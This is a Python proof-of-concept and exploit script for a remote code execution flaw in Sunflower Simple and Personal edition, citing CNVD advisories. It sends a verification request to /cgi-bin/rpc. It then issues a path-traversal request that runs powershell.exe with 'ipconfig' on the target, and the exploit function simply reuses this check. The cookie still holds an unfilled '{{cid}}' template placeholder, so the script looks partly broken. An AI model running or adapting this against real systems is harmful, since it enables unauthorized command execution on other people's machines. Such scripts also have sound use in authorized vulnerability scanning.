import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Sunflower Simple and Personal edition RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://www.1024sou.com/article/741374.html", 
            "https://copyfuture.com/blogs-details/202202192249158884", 
            "https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270", 
            "https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cnvd", "cnvd2020", "sunflower", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/cgi-bin/rpc"""
        method = "POST"
        data = """action=verify-haras"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+ipconfig"""
        method = "GET"
        data = """"""
        headers = {'Cookie': 'CID={{cid}}'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp0.status_code == 200 and resp1.status_code == 200 and "verify_string" in resp0.text and "Windows IP" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url